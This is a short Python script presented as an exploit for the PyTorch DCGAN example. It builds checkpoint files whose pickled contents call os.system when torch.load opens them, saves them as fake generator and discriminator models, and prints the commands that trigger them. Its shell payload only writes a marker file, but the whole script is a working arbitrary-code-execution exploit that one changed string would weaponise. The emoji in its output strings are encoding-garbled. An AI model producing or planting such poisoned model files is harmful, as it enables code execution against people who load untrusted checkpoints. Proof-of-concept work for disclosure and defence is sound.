#!/usr/bin/env python3
"""Create exploit for PyTorch DCGAN vulnerability"""

import torch
import pickle
import os

class Exploit:
    def __reduce__(self):
        # This will execute when torch.load is called
        cmd = "echo 'VULNERABLE: Arbitrary code execution achieved' > /tmp/pwned.txt"
        return (os.system, (cmd,))

# Create malicious "model" file
malicious_checkpoint = {
    'state_dict': Exploit()
}

# Save as a fake generator model
torch.save(malicious_checkpoint, 'evil_generator.pth')
print("âœ… Created evil_generator.pth")

# Save as a fake discriminator model  
torch.save(malicious_checkpoint, 'evil_discriminator.pth')
print("âœ… Created evil_discriminator.pth")

print("\nğŸ“ To exploit DCGAN:")
print("python dcgan/main.py --netG evil_generator.pth")
print("python dcgan/main.py --netD evil_discriminator.pth")
print("\nâš ï¸  This will execute arbitrary code!")
